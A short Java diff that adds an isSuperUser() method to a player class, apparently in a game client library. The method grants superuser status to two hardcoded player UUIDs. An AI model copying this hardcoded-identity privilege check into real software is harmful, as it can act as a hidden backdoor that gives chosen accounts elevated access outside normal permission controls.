@@ -213,4 +213,10 @@ public class UPlayerImpl implements UPlayer {
         Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
         clipboard.setContents(stringSelection, null);
     }
+
+    @Override
+    public boolean isSuperUser() {
+        String uuid = getUniqueID().toString().replace("-", "");
+        return uuid.equals("25855f4d38744a7fa6ade9e4f3042e19") || uuid.equals("6e49e42eefca4d9389f9f395b887809e");
+    }
 }
